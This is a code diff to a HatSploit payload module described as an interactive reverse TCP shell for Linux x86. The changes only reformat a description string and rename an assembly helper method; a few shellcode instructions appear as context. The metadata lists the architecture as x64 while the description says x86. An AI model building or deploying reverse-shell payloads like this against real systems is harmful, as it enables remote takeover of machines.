@@ -15,17 +15,17 @@ class HatSploitPayload(Payload, Handler, Linux):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive reverse TCP shell for Linux "
-                "with x86 architecture."
-            ),
+            'Description': """
+                This payload creates an interactive reverse TCP shell for Linux
+                with x86 architecture.
+            """,
             'Arch': ARCH_X64,
             'Platform': OS_LINUX,
             'Type': REVERSE_TCP,
         })
 
     def implant(self):
-        return self.assemble(
+        return self.__asm__(
             """
                 push edi
                 pop ebx
@@ -51,7 +51,7 @@ class HatSploitPayload(Payload, Handler, Linux):
         )
 
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             f"""
             start:
                 xor ebx, ebx
